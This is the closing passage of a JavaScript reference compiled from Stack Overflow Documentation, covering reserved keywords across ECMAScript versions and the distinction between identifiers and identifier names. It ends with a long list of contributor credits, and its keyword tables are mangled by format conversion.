  <b>else null</b>                                        with
enum <b>return</b>
<b>ECMAScript 2</b>
Added <b>24</b> additional reserved keywords. (New additions in bold).
Version = 3 Version = E4X

| <b>*A*</b>  <b>*F F*</b>  <b>*P*</b>         | <b>*P</b>*  <b>*Z*</b>    |
| <b>abstractfinal</b>                         | <b>public</b>               |
| <b>boolean finally</b>                       | <b>return</b>               |
| <b>break float</b>                           | <b>short</b>                |
| <b>byte for</b>                              | <b>static</b>               |
| <b>case function</b>                         | super                    |
| <b>catch goto</b>                            | <b>switch</b>               |
| <b>char</b> if                               | <b>synchronized</b>         |
class <b>implementsthis const</b> import <b>throw continue</b>in <b>throws</b>
debugger<b>instanceoftransient</b>
  <b>default</b>            <b>int</b>                     <b>true</b>
  <b>delete</b>             <b>interface</b>               <b>try</b>
  do                     <b>long</b>                    <b>typeof</b>
  <b>double</b>             <b>native</b>                  <b>var</b>
  <b>else</b>               <b>new</b>                     <b>void</b>
  enum                   <b>null</b>                    <b>volatile</b>
  export                 <b>package</b>                 while
  extends                <b>private</b>                 with
<b>false</b> protected
<b>ECMAScript 5 / 5.1</b>
There was no change since *ECMAScript 3*.

*ECMAScript 5* removed int, byte, char, <b>goto</b>, long, final, float,
short, double, native, throws, boolean, abstract, volatile, transient,
and synchronized; it added <b>let</b> and yield.

| <b>*A*</b>  <b>*F*</b> | <b>*F*</b>  <b>*P*</b>         | <b>*P*</b>   |
                       |                             | <b>*Z*</b>      |
| <b>break</b>             | <b>finally</b>                 | public         |
| <b>case</b>              | <b>for</b>                     | <b>return</b>     |
| <b>catch</b>             | <b>function</b>                | <b>static</b>     |
| class                 | if                          | super          |
<b>const</b> implements<b>switch continue</b>import <b>this</b> debuggerin
<b>throw</b>
<b>default</b>              <b>instanceoftrue</b>            
  -  -
  <b>delete</b>               interface                     <b>try</b>
  do                       <b>let</b>                       <b>typeof</b>
  <b>else</b>                 <b>new</b>                       <b>var</b>
  enum                     <b>null</b>                      <b>void</b>
  export                   package                       while
  extends                  private                       with
  <b>false</b>                protected                     <b>yield</b>
implements, <b>let</b>, private, public, interface, package, protected,
<b>static</b>, and yield are <b>disallowed in strict mode only</b>.
eval and arguments are not reserved words but they act like it in
<b>strict mode</b>. <b>ECMAScript 6 / ECMAScript 2015</b>
| <b>*A*</b>  <b>*E E*</b>  <b>*R*</b>                   | <b>*S*</b>   |
|                                                     | <b>*Z*</b>      |
| <b>break</b> export                                    | super          |
| <b>case</b> extends                                    | <b>switch</b>     |
| <b>catch finally</b>                                   | <b>this</b>       |
| class <b>for</b>                                       | <b>throw</b>      |
| <b>const function</b>                                  | <b>try</b>        |
| <b>continue</b>if                                      | <b>typeof</b>     |
| debuggerimport                                      | <b>var</b>        |
| <b>default</b> in                                      | <b>void</b>       |
<b>delete instanceof</b>while
do <b>new</b> with
<b>else return</b> yield
Future reserved keywords
The following are reserved as future keywords by the ECMAScript
specification. They have no special functionality at present, but they
might at some future time, so they cannot be used as identifiers. enum
The following are only reserved when they are found in strict mode
code:
implementspackage public interface private &grave;static&apos; <b>let</b>
protected
Future reserved keywords in older standards
The following are reserved as future keywords by older ECMAScript
specifications (ECMAScript 1 till 3).
abstractfloat short boolean <b>goto</b> synchronized byte
<b>instanceof</b>throws
char int transient double long volatile final native
Additionally, the literals null, true, and false cannot be used as
identifiers in ECMAScript.
From the [Mozilla Developer
Network](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar).
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="chA-2">Section A.2: Identifiers & Identifier Names</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
With regards to reserved words there is a small distinctions between
the *&quot;Identifiers&quot;* used for the likes of variable or function names
and the *&quot;Identifier Names&quot;* allowed as properties of composite data
types.
For example the following will result in an illegal syntax error:
<b>var</b>
<b>break</b>
=
<b>true</b>
;
Uncaught SyntaxError: Unexpected token break
However the name is deemed valid as a property of an object (as of
ECMAScript 5+):
<b>var</b>
obj
=
{
<b>break</b>
:
<b>true</b>
}
;
console.
log
(
obj.
<b>break</b>
)
;
To quote from [this
answer](http://stackoverflow.com/questions/40209367/do-reserved-words-need-to-be-quoted-when-set-as-property-names-of-javascript-obj/40210179#40210179):
From the [ECMAScript® 5.1 Language
Specification](http://www.ecma-international.org/ecma-262/5.1):
Section 7.6
Identifier Names are tokens that are interpreted according to the
grammar given in the "Identifiers" section of chapter 5 of the Unicode
standard, with some small modifications. An Identifier is an
IdentifierName that is not a ReservedWord (see
[7.6.1](http://www.ecma-international.org/ecma-262/5.1/#sec-7.6.1)).
<b>Syntax</b>
Identifier
::
IdentifierName but not ReservedWord
By specification, a
ReservedWord
is:
Section 7.6.1
A reserved word is an
IdentifierName
that cannot be used as an
Identifier
.
ReservedWord
::
Keyword
FutureReservedWord
NullLiteral
BooleanLiteral
This includes keywords, future keywords, <b>null</b>, and boolean
literals. The full list of keywords are in [Sections
7.6.1](http://www.ecma-international.org/ecma-262/5.1/#sec-7.6.1) and
literals are in [Section
7.8](http://www.ecma-international.org/ecma-262/5.1/#sec-7.8).
The above (Section 7.6) implies that IdentifierNames can be
ReservedWords, and from the specification for [object
initializers](http://www.ecma-international.org/ecma-262/5.1/#sec-11.1.5):
Section 11.1.5
<b>Syntax</b>
ObjectLiteral
:
{
}
{
PropertyNameAndValueList
}
{
PropertyNameAndValueList
,
}
Where
PropertyName
is, by specification:
PropertyName
:
IdentifierName
StringLiteral
NumericLiteral
As you can see, a PropertyName may be an IdentifierName, thus allowing
ReservedWords to be PropertyNames. That conclusively tells us that,
*by specification*, it is allowed to have ReservedWords such as class
and <b>var</b> as PropertyNames unquoted just like string literals or
numeric literals.
To read more, see [Section
7.6](http://www.ecma-international.org/ecma-262/5.1/#sec-7.6) -
Identifier Names and Identifiers.
<b>*Note:*</b> the syntax highlighter in this example has spotted the
reserved word and still highlighted it. While the example is valid
JavaScript developers can get caught out by some compiler /
transpiler, linter and minifier tools that argue otherwise.
# Credits
Thank you greatly to all the people from Stack Overflow Documentation
who helped provide this content, more changes can be sent to
[web@petercv.com] for new content to be published or
updated
[16807](https://stackoverflow.com/users/2584689/)            Chapter 104
[2426021684](https://stackoverflow.com/users/6369276/)       Chapters 1, 7, 12, 42 and 59
[4444](https://stackoverflow.com/users/1464444/)             Chapter 23
[4m1r](https://stackoverflow.com/users/2296997/)             Chapter 100
[A.J](https://stackoverflow.com/users/2720743/)              Chapter 61
[A.M.K](https://stackoverflow.com/users/900747/)             Chapters 5, 12, 40, 63, 72 and 73

  [Aadit M Shah](https://stackoverflow.com/users/783743/)      Chapter 29

  [Abdelaziz                                                   Chapter 1
  Mokhnache](https://stackoverflow.com/users/5192846/)         

  [Abhishek](https://stackoverflow.com/users/3925609/)         Chapter 65

  [Abhishek Singh](https://stackoverflow.com/users/5716106/)   Chapter 48

  [Adam Heath](https://stackoverflow.com/users/219750/)        Chapter 59

  [adius](https://stackoverflow.com/users/1850340/)            Chapter 31

  [adriennetacke](https://stackoverflow.com/users/3731657/)    Chapter 68

  [Aeolingamenfel](https://stackoverflow.com/users/3681236/)   Chapter 62

  [afzalex](https://stackoverflow.com/users/3626698/)          Chapter 42

  [Ahmed Ayoub](https://stackoverflow.com/users/2637185/)      Chapter 12

  [aikeru](https://stackoverflow.com/users/76840/)             Chapter 14

  [Ajedi32](https://stackoverflow.com/users/1157054/)          Chapter 16

  [Akshat Mahajan](https://stackoverflow.com/users/2271269/)   Chapter 53

  [Ala Eddine                                                  Chapters 1, 24 and 56
  JEBALI](https://stackoverflow.com/users/1343790/)            

  [Alberto                                                     Chapters 13, 14 and 43
  Nicoletti](https://stackoverflow.com/users/2073379/)         

  [Alejandro Nanez](https://stackoverflow.com/users/1405803/)  Chapter 12

  [Alex](https://stackoverflow.com/users/1397240/)             Chapter 63

  [Alex Filatov](https://stackoverflow.com/users/2173016/)     Chapters 14, 35 and 67

  [Alex Logan](https://stackoverflow.com/users/6161714/)       Chapter 5

  [Alexander                                                   Chapter 1
  O&apos;Mara](https://stackoverflow.com/users/3155639/)           

  [Alexandre N.](https://stackoverflow.com/users/7179086/)     Chapters 1 and 42

  [aluxian](https://stackoverflow.com/users/1133344/)          Chapter 81

  [amflare](https://stackoverflow.com/users/5937428/)          Chapter 20

  [Aminadav](https://stackoverflow.com/users/1229624/)         Chapters 1, 35 and 104

  [Andrew Burgess](https://stackoverflow.com/users/12096/)     Chapter 55

  [Andrew Myers](https://stackoverflow.com/users/5764553/)     Chapter 4

  [Andrew                                                      Chapters 59 and 98
  Sklyarevsky](https://stackoverflow.com/users/894973/)        

  [Andrew Sun](https://stackoverflow.com/users/1591742/)       Chapter 59

  [Andrey](https://stackoverflow.com/users/2182767/)           Chapter 14

  [Angel Politis](https://stackoverflow.com/users/6313073/)    Chapters 36 and 47

  [Angela Amarapala](https://stackoverflow.com/users/6284797/) Chapter 26

  [Angelos Chalaris](https://stackoverflow.com/users/1650200/) Chapters 13, 37 and 46

  [Ani Menon](https://stackoverflow.com/users/2142994/)        Chapters 1 and 36

  [Anirudh Modi](https://stackoverflow.com/users/4197363/)     Chapters 12, 19, 50, 60 and 62

  [Anirudha](https://stackoverflow.com/users/598420/)          Chapter 103

  [Anko](https://stackoverflow.com/users/777586/)              Chapter 1

  [Ankur Anand](https://stackoverflow.com/users/3027001/)      Chapter 1

  [Anurag Singh                                                Chapter 87
  Bisht](https://stackoverflow.com/users/3436826/)             

  [Ara Yeressian](https://stackoverflow.com/users/1324935/)    Chapter 42

  [Araknid](https://stackoverflow.com/users/4268627/)          Chapters 11 and 30

  [arbybruce](https://stackoverflow.com/users/4731569/)        Chapter 33
  

  
  [Armfoot](https://stackoverflow.com/users/1326147/)            Chapter 62
   
  [AstroCB](https://stackoverflow.com/users/3366929/)            Chapter 1

  [Aswin](https://stackoverflow.com/users/1624261/)              Chapter 21

  [Atakan Goktepe](https://stackoverflow.com/users/5366882/)     Chapter 5

  [ATechieThought](https://stackoverflow.com/users/3768367/)     Chapter 1

  [Ates Goral](https://stackoverflow.com/users/23501/)           Chapters 3, 35 and 42

  [Awal Garg](https://stackoverflow.com/users/3459110/)          Chapters 41 and 42

  [azz](https://stackoverflow.com/users/1280997/)                Chapter 10

  [Badacadabra](https://stackoverflow.com/users/6910253/)        Chapter 25

  [baga](https://stackoverflow.com/users/1816770/)               Chapter 5

  [balpha](https://stackoverflow.com/users/115866/)              Chapter 12

  [Bamieh](https://stackoverflow.com/users/5384679/)             Chapter 12

  [BarakD](https://stackoverflow.com/users/5196561/)             Chapter 22

  [Barmar](https://stackoverflow.com/users/1491895/)             Chapter 14

  [Basilin Joe](https://stackoverflow.com/users/3521176/)        Chapter 28

  [Beau](https://stackoverflow.com/users/60371/)                 Chapter 5

  [Bekim Bacaj](https://stackoverflow.com/users/5896426/)        Chapter 1

  [Ben](https://stackoverflow.com/users/348314/)                 Chapter 12

  [Ben McCormick](https://stackoverflow.com/users/1424361/)      Chapter 60

  [Benjadahl](https://stackoverflow.com/users/5056525/)          Chapter 19

  [Bennett](https://stackoverflow.com/users/5067993/)            Chapter 70

  [bfavaretto](https://stackoverflow.com/users/825789/)          Chapter 1

  [Bit Byte](https://stackoverflow.com/users/3434588/)           Chapter 89

  [Black](https://stackoverflow.com/users/4684797/)              Chapter 1

  [Blindman67](https://stackoverflow.com/users/3877726/)         Chapters 10, 12, 14, 28, 41, 56, 84 and
                                                                 104

  [bloodyKnuckles](https://stackoverflow.com/users/2743458/)     Chapter 63

  [Blubberguy22](https://stackoverflow.com/users/3842050/)       Chapter 11

  [Blue Sheep](https://stackoverflow.com/users/2019825/)         Chapters 14 and 104

  [BluePill](https://stackoverflow.com/users/4938301/)           Chapter 7

  [Blundering                                                    Chapters 1 and 42
  Philosopher](https://stackoverflow.com/users/2430414/)         

  [bobylito](https://stackoverflow.com/users/654253/)            Chapter 42

  [Boopathi Rajaa](https://stackoverflow.com/users/556124/)      Chapters 22, 41, 50 and 63

  [Borja Tur](https://stackoverflow.com/users/6181766/)          Chapters 13 and 19

  [Božo Stojković](https://stackoverflow.com/users/4936137/)     Chapters 1, 12 and 42

  [Brandon Buck](https://stackoverflow.com/users/445322/)        Chapter 1

  [Brendan Doherty](https://stackoverflow.com/users/5303755/)    Chapter 50

  [brentonstrine](https://stackoverflow.com/users/925897/)       Chapter 19

  [Brett DeWoody](https://stackoverflow.com/users/438581/)       Chapter 12

  [Brett Zamir](https://stackoverflow.com/users/271577/)         Chapters 1 and 4

  [Brian Liu](https://stackoverflow.com/users/4796724/)          Chapter 105

  [bwegs](https://stackoverflow.com/users/745750/)               Chapters 1, 56 and 62

  [C L K Kissane](https://stackoverflow.com/users/4224536/)      Chapter 5

  [Callan Heard](https://stackoverflow.com/users/2030247/)       Chapter 50

  [CamJohnson26](https://stackoverflow.com/users/3587534/)       Chapter 50

  [catalogue_number](https://stackoverflow.com/users/3264977/)   Chapter 1

  [cchamberlain](https://stackoverflow.com/users/769871/)        Chapter 5

  [CD..](https://stackoverflow.com/users/139300/)                Chapters 12 and 13

  [cdm](https://stackoverflow.com/users/4663542/)                Chapter 58

  [cdrini](https://stackoverflow.com/users/2317712/)             Chapters 19 and 55

  [Cerbrus](https://stackoverflow.com/users/1835379/)            Chapters 1, 5, 14, 17, 40, 42, 99 and 103

  [cFreed](https://stackoverflow.com/users/3415269/)             Chapter 10

  [Charlie H](https://stackoverflow.com/users/4185234/)          Chapters 10, 14, 35 and 54

  [Chong Lip Phang](https://stackoverflow.com/users/2691226/)    Chapter 50
  

  -
  [choz](https://stackoverflow.com/users/1627271/)             Chapter 19
   
  [Chris](https://stackoverflow.com/users/536950/)             Chapters 10 and 22

  [Christian](https://stackoverflow.com/users/6702958/)        Chapter 2

  [Christian                                                   Chapter 13
  Landgren](https://stackoverflow.com/users/913800/)           

  [Christoph](https://stackoverflow.com/users/1047823/)        Chapter 1

  [Christophe                                                  Chapter 42
  Marois](https://stackoverflow.com/users/1558527/)            

  [Christopher                                                 Chapter 27
  Ronning](https://stackoverflow.com/users/2898801/)           

  [Claudiu](https://stackoverflow.com/users/15055/)            Chapters 7 and 42

  [Cliff Burton](https://stackoverflow.com/users/4120911/)     Chapters 13 and 19

  [Code Uniquely](https://stackoverflow.com/users/1582029/)    Chapter 18

  [codemano](https://stackoverflow.com/users/7798155/)         Chapter 12

  [code_monk](https://stackoverflow.com/users/977083/)         Chapter 12

  [CodingIntrigue](https://stackoverflow.com/users/571194/)    Chapters 7, 12, 13, 50, 57 and 69

  [Colin](https://stackoverflow.com/users/2986033/)            Chapter 10

  [cone56](https://stackoverflow.com/users/2229579/)           Chapter 92

  [Conlin Durbin](https://stackoverflow.com/users/1466592/)    Chapter 27

  [CPHPython](https://stackoverflow.com/users/6225838/)        Chapters 5, 12, 19, 50, 56 and 62

  [Creative John](https://stackoverflow.com/users/5065086/)    Chapter 24

  [CroMagnon](https://stackoverflow.com/users/3687463/)        Chapters 27 and 48

  [csander](https://stackoverflow.com/users/2276009/)          Chapters 6, 8, 18, 38, 43, 56 and 85

  [cswl](https://stackoverflow.com/users/5026445/)             Chapters 15 and 81

  [Daksh Gupta](https://stackoverflow.com/users/5662469/)      Chapters 1 and 62

  [Damon](https://stackoverflow.com/users/5026139/)            Chapters 11, 12, 19 and 62

  [Dan Pantry](https://stackoverflow.com/users/1073868/)       Chapter 42

  [Daniel](https://stackoverflow.com/users/3346612/)           Chapter 12

  [Daniel Herr](https://stackoverflow.com/users/3591628/)      Chapters 11, 12, 18, 30, 35, 41, 42 and 55

  [Daniel LIn](https://stackoverflow.com/users/4434245/)       Chapter 79

  [daniellmb](https://stackoverflow.com/users/131944/)         Chapters 1 and 42

  [daniphilia](https://stackoverflow.com/users/6558051/)       Chapter 102

  [DarkKnight](https://stackoverflow.com/users/4578017/)       Chapters 19 and 60

  [dauruy](https://stackoverflow.com/users/4422260/)           Chapter 12

  [Dave Sag](https://stackoverflow.com/users/917187/)          Chapters 42 and 100

  [David Archibald](https://stackoverflow.com/users/5461005/)  Chapter 1

  [David G.](https://stackoverflow.com/users/3838549/)         Chapters 1 and 42

  [David Knipe](https://stackoverflow.com/users/2064808/)      Chapter 56

  [Davis](https://stackoverflow.com/users/4621303/)            Chapters 14, 19, 59 and 62

  [DawnPaladin](https://stackoverflow.com/users/1805453/)      Chapters 5, 59 and 99

  [Deepak Bansal](https://stackoverflow.com/users/6794259/)    Chapter 99

  [Denys Séguret](https://stackoverflow.com/users/263525/)     Chapter 104

  [Derek 朕會功夫](https://stackoverflow.com/users/283863/)    Chapter 35

  [DevDig](https://stackoverflow.com/users/1203741/)           Chapter 62

  [Devid Farinelli](https://stackoverflow.com/users/4695325/)  Chapters 1 and 99

  [devlin carnate](https://stackoverflow.com/users/2359687/)   Chapter 42

  [Diego Molina](https://stackoverflow.com/users/6629549/)     Chapter 59

  [dns_nx](https://stackoverflow.com/users/3725142/)           Chapter 12

  [Domenic](https://stackoverflow.com/users/3191/)             Chapters 12 and 49

  [DontVoteMeDown](https://stackoverflow.com/users/1267304/)   Chapter 1

  [Downgoat](https://stackoverflow.com/users/1620622/)         Chapters 73 and 96

  [Dr. Cool](https://stackoverflow.com/users/1739408/)         Chapter 90

  [Dr. J.                                                      Chapter 12
  Testington](https://stackoverflow.com/users/6594854/)        

  [Drew](https://stackoverflow.com/users/595605/)              Chapter 14

  [dunnza](https://stackoverflow.com/users/561902/)            Chapter 42

  [Durgpal Singh](https://stackoverflow.com/users/1759015/)    Chapters 19 and 42
  -

  
  [DVJex](https://stackoverflow.com/users/4560343/)            Chapter 99
   
  [DzinX](https://stackoverflow.com/users/18745/)              Chapter 12

  [Ehsan Sajjad](https://stackoverflow.com/users/1875256/)     Chapter 99

  [Eirik Birkeland](https://stackoverflow.com/users/3897504/)  Chapter 19

  [Ekin](https://stackoverflow.com/users/2852427/)             Chapters 37 and 67

  [eltonkamami](https://stackoverflow.com/users/5267669/)      Chapters 18, 19, 31, 62 and 99

  [Emissary](https://stackoverflow.com/users/1238344/)         Chapters 5, 17, 104 and 106

  [Emre Bolat](https://stackoverflow.com/users/6382007/)       Chapter 106

  [Erik Minarini](https://stackoverflow.com/users/6093353/)    Chapter 42

  [Ethan](https://stackoverflow.com/users/1261879/)            Chapter 62

  [et_l](https://stackoverflow.com/users/3836051/)             Chapters 13 and 65

  [Evan Bechtol](https://stackoverflow.com/users/4515720/)     Chapter 42

  [Everettss](https://stackoverflow.com/users/3708596/)        Chapters 1, 19 and 57

  [Explosion Pills](https://stackoverflow.com/users/454533/)   Chapter 81

  [Fab313](https://stackoverflow.com/users/1611417/)           Chapter 22

  [fracz](https://stackoverflow.com/users/878514/)             Chapters 12 and 42

  [Frank Tan](https://stackoverflow.com/users/4326495/)        Chapter 60

  [FrankCamara](https://stackoverflow.com/users/5223631/)      Chapter 12

  [FredMaggiowski](https://stackoverflow.com/users/3119050/)   Chapter 13

  [fson](https://stackoverflow.com/users/1530110/)             Chapters 42 and 81

  [Gabriel                                                     Chapter 41
  Furstenheim](https://stackoverflow.com/users/1536133/)       

  [Gabriel L.](https://stackoverflow.com/users/4876305/)       Chapter 42

  [Gaurang Tandon](https://stackoverflow.com/users/2675672/)   Chapter 14

  [Gavishiddappa                                               Chapter 19
  Gadagi](https://stackoverflow.com/users/5950377/)            

  [gca](https://stackoverflow.com/users/1421069/)              Chapter 10

  [gcampbell](https://stackoverflow.com/users/6303733/)        Chapter 7

  [geekonaut](https://stackoverflow.com/users/585967/)         Chapters 61, 63 and 89

  [georg](https://stackoverflow.com/users/989121/)             Chapter 42

  [George Bailey](https://stackoverflow.com/users/463304/)     Chapters 12, 13, 30 and 90

  [GingerPlusPlus](https://stackoverflow.com/users/3821804/)   Chapter 99

  [gman](https://stackoverflow.com/users/128511/)              Chapters 1, 5 and 29

  [gnerkus](https://stackoverflow.com/users/2259144/)          Chapter 11

  [GOTO 0](https://stackoverflow.com/users/1083663/)           Chapters 7, 67 and 78

  [Grundy](https://stackoverflow.com/users/2881286/)           Chapter 10

  [Guybrush                                                    Chapter 22
  Threepwood](https://stackoverflow.com/users/3869455/)        

  [H. Pauwelyn](https://stackoverflow.com/users/4551041/)      Chapters 1 and 65

  [hairboat](https://stackoverflow.com/users/865899/)          Chapter 19

  [Hans Strausl](https://stackoverflow.com/users/2022914/)     Chapters 3 and 12

  [hansmaad](https://stackoverflow.com/users/498298/)          Chapter 12

  [Hardik Kanjariya                                            Chapters 12, 14, 46 and 47
  ツ](https://stackoverflow.com/users/4423221/)                

  [harish gadiya](https://stackoverflow.com/users/3979073/)    Chapter 104

  [haykam](https://stackoverflow.com/users/5513988/)           Chapters 1, 5, 7 and 101

  [Hayko Koryun](https://stackoverflow.com/users/771466/)      Chapter 14

  [HC&lowbar;](https://stackoverflow.com/users/2762310/)             Chapter 64

  [HDT](https://stackoverflow.com/users/2560137/)              Chapter 43

  [Hendry](https://stackoverflow.com/users/1728166/)           Chapter 91

  [Henrique                                                    Chapters 42 and 56
  Barcelos](https://stackoverflow.com/users/1798341/)          

  [Hi I&apos;m Frogatto](https://stackoverflow.com/users/1841194/) Chapter 7

  [hiby](https://stackoverflow.com/users/5709868/)             Chapter 33

  [hindmost](https://stackoverflow.com/users/2118955/)         Chapters 14 and 29

  [hirnwunde](https://stackoverflow.com/users/5690568/)        Chapter 5

  [hirse](https://stackoverflow.com/users/1469028/)            Chapter 36

  [HopeNick](https://stackoverflow.com/users/1349893/)         Chapters 15 and 85
  

  
  [Hunan                                                    Chapter 12
  Rostomyan](https://stackoverflow.com/users/2672370/)      
  - 
  [I am always                                              Chapter 83
  right](https://stackoverflow.com/users/4038917/)          

  [Iain Ballard](https://stackoverflow.com/users/423033/)   Chapter 50

  [Ian](https://stackoverflow.com/users/21061/)             Chapters 10, 19 and 35

  [iBelieve](https://stackoverflow.com/users/1917313/)      Chapters 55 and 57

  [Igor Raush](https://stackoverflow.com/users/1391671/)    Chapters 10, 41, 42, 57 and 62

  [Inanc Gumus](https://stackoverflow.com/users/115363/)    Chapters 1, 5 and 81

  [inetphantom](https://stackoverflow.com/users/2828611/)   Chapter 1

  [Ishmael                                                  Chapter 12
  Smyrnow](https://stackoverflow.com/users/192217/)         

  [Isti115](https://stackoverflow.com/users/1831096/)       Chapter 12

  [iulian](https://stackoverflow.com/users/3120525/)        Chapter 15

  [Ivan](https://stackoverflow.com/users/6331369/)          Chapter 36

  [ivarni](https://stackoverflow.com/users/957731/)         Chapter 22

  [J F](https://stackoverflow.com/users/5244995/)           Chapters 14, 58, 59, 89 and 90

  [jabacchetta](https://stackoverflow.com/users/4500152/)   Chapter 62

  [James                                                    Chapter 32
  Donnelly](https://stackoverflow.com/users/1317805/)       

  [James Long](https://stackoverflow.com/users/557019/)     Chapter 12

  [Jamie](https://stackoverflow.com/users/3222831/)         Chapter 10

  [Jan Pokorný](https://stackoverflow.com/users/6099426/)   Chapter 13

  [Jason Park](https://stackoverflow.com/users/4548134/)    Chapter 12

  [Jay](https://stackoverflow.com/users/3082194/)           Chapters 19 and 22

  [JBCP](https://stackoverflow.com/users/1017787/)          Chapters 3 and 42

  [jbmartinez](https://stackoverflow.com/users/3397274/)    Chapter 19

  [jchavannes](https://stackoverflow.com/users/744298/)     Chapter 30

  [jchitel](https://stackoverflow.com/users/1234443/)       Chapter 42

  [JCOC611](https://stackoverflow.com/users/532978/)        Chapter 40

  [JDB](https://stackoverflow.com/users/211627/)            Chapter 19

  [Jean Lourenço](https://stackoverflow.com/users/1964479/) Chapter 19

  [Jef](https://stackoverflow.com/users/4142458/)           Chapter 106

  [Jeremy Banks](https://stackoverflow.com/users/1114/)     Chapters 1, 10, 12, 13, 14, 19, 22, 27, 33, 35, 36,
                                                            50, 51, 53, 54, 55, 62, 71, 94 and 97

  [Jeremy J                                                 Chapter 12
  Starcher](https://stackoverflow.com/users/807787/)        

  [Jeroen](https://stackoverflow.com/users/419956/)         Chapters 1 and 11

  [JimmyLv](https://stackoverflow.com/users/5871340/)       Chapter 81

  [Jinw](https://stackoverflow.com/users/4794828/)          Chapter 79

  [jisoo](https://stackoverflow.com/users/6377969/)         Chapter 12

  [jitendra                                                 Chapter 1
  varshney](https://stackoverflow.com/users/6402939/)       

  [Jivings](https://stackoverflow.com/users/334274/)        Chapters 10, 35, 50 and 55

  [jkdev](https://stackoverflow.com/users/3345375/)         Chapters 3, 10, 12, 18, 30, 35, 36, 39 and 56

  [JKillian](https://stackoverflow.com/users/3124288/)      Chapter 31

  [jmattheis](https://stackoverflow.com/users/4244993/)     Chapter 1

  [John](https://stackoverflow.com/users/6310232/)          Chapter 13

  [John Archer](https://stackoverflow.com/users/887930/)    Chapter 99

  [John C](https://stackoverflow.com/users/1173776/)        Chapter 8

  [John                                                     Chapter 28
  Oksasoglu](https://stackoverflow.com/users/6713446/)      

  [John Slegers](https://stackoverflow.com/users/1946501/)  Chapters 1, 8, 12, 35, 42, 53 and 62

  [John Syrinek](https://stackoverflow.com/users/400550/)   Chapters 29 and 68

  [Jonas W.](https://stackoverflow.com/users/5260024/)      Chapter 13

  [Jonathan Lam](https://stackoverflow.com/users/2397327/)  Chapters 1, 7, 29 and 45

  [Jonathan                                                 Chapters 18, 27 and 31
  Walters](https://stackoverflow.com/users/4838658/)        

  [Joseph](https://stackoverflow.com/users/575527/)         Chapters 19 and 42

  [Joshua                                                   Chapters 1 and 25
  Kleveter](https://stackoverflow.com/users/4581977/)       

  [Junbang Huang](https://stackoverflow.com/users/3077801/) Chapter 76
  

  -
  [Just a student](https://stackoverflow.com/users/962603/) Chapters 5 and 74
  - 
  [K48](https://stackoverflow.com/users/6269864/)           Chapters 1, 9, 10, 33, 42 and 99

  [kamoroso94](https://stackoverflow.com/users/2727710/)    Chapters 8, 14, 19 and 64

  [kanaka](https://stackoverflow.com/users/471795/)         Chapter 61

  [kapantzak](https://stackoverflow.com/users/1221792/)     Chapters 20 and 62

  [Karuppiah](https://stackoverflow.com/users/4772008/)     Chapter 1

  [Kayce Basques](https://stackoverflow.com/users/1669860/) Chapter 63

  [Keith](https://stackoverflow.com/users/905/)             Chapters 81 and 82

  [Kemi](https://stackoverflow.com/users/5168448/)          Chapter 69

  [kevguy](https://stackoverflow.com/users/5836921/)        Chapters 62 and 63

  [Kevin Katzke](https://stackoverflow.com/users/1280289/)  Chapter 10

  [Kevin Law](https://stackoverflow.com/users/585371/)      Chapter 19

  [khawarPK](https://stackoverflow.com/users/1465579/)      Chapter 10

  [Kit Grose](https://stackoverflow.com/users/181495/)      Chapter 54

  [Knu](https://stackoverflow.com/users/248058/)            Chapters 10, 11, 13, 14, 18, 35, 36, 97 and 99

  [Kousha](https://stackoverflow.com/users/834045/)         Chapter 10

  [Kyle Blake](https://stackoverflow.com/users/4597392/)    Chapters 10 and 12

  [L Bahr](https://stackoverflow.com/users/6194193/)        Chapters 10, 37, 66 and 102

  [leo.fcx](https://stackoverflow.com/users/3417449/)       Chapter 42

  [Li357](https://stackoverflow.com/users/5647260/)         Chapter 106

  [Liam](https://stackoverflow.com/users/542251/)           Chapter 17

  [Lisa Gagarina](https://stackoverflow.com/users/4255426/) Chapter 65

  [LiShuaiyuan](https://stackoverflow.com/users/7165616/)   Chapter 35

  [Little Child](https://stackoverflow.com/users/1894684/)  Chapter 41

  [little pootis](https://stackoverflow.com/users/1947276/) Chapter 1

  [Louis                                                    Chapters 13, 35 and 65
  Barranqueiro](https://stackoverflow.com/users/3755845/)   

  [Luís Hendrix](https://stackoverflow.com/users/5174914/)  Chapters 10, 60 and 104

  [Luc125](https://stackoverflow.com/users/746757/)         Chapters 7 and 12

  [luisfarzati](https://stackoverflow.com/users/1206952/)   Chapter 42

  [M. Erraysy](https://stackoverflow.com/users/5524646/)    Chapter 12

  [Maciej Gurban](https://stackoverflow.com/users/2066118/) Chapters 12 and 65

  [Madara Uchiha](https://stackoverflow.com/users/871050/)  Chapters 19, 20, 59, 60, 81 and 82

  [maheeka](https://stackoverflow.com/users/1403246/)       Chapter 9

  [maioman](https://stackoverflow.com/users/2417031/)       Chapters 19 and 42

  [Marco Bonelli](https://stackoverflow.com/users/3889449/) Chapters 3, 53 and 96

  [Marco                                                    Chapters 3, 10, 13, 17, 20, 27, 30, 42, 46, 56,
  Scabbiolo](https://stackoverflow.com/users/2002588/)      57, 68, 69, 81 and 90

  [Marina K.](https://stackoverflow.com/users/5311928/)     Chapters 10 and 104

  [mark](https://stackoverflow.com/users/2682218/)          Chapters 19 and 56

  [Mark                                                     Chapters 5 and 99
  Schultheiss](https://stackoverflow.com/users/125981/)     

  [mash](https://stackoverflow.com/users/6572285/)          Chapter 10

  [MasterBob](https://stackoverflow.com/users/5535493/)     Chapters 1, 19, 24, 25 and 81

  [Matas                                                    Chapters 1, 6 and 42
  Vaitkevicius](https://stackoverflow.com/users/1509764/)   

  [Mathias Bynens](https://stackoverflow.com/users/96656/)  Chapter 1

  [Matt Lishman](https://stackoverflow.com/users/3379536/)  Chapter 57

  [Matt S](https://stackoverflow.com/users/163024/)         Chapter 31

  [Mattew Whitt](https://stackoverflow.com/users/3264217/)  Chapter 42

  [Matthew Crumley](https://stackoverflow.com/users/2214/)  Chapters 18, 67, 84 and 104

  [mauris](https://stackoverflow.com/users/126039/)         Chapters 33 and 56

  [Max Alcala](https://stackoverflow.com/users/2785476/)    Chapters 12, 19, 41 and 56

  [Maximillian                                              Chapter 42
  Laumeister](https://stackoverflow.com/users/2234742/)     

  [Md. Mahbubul                                             Chapter 13
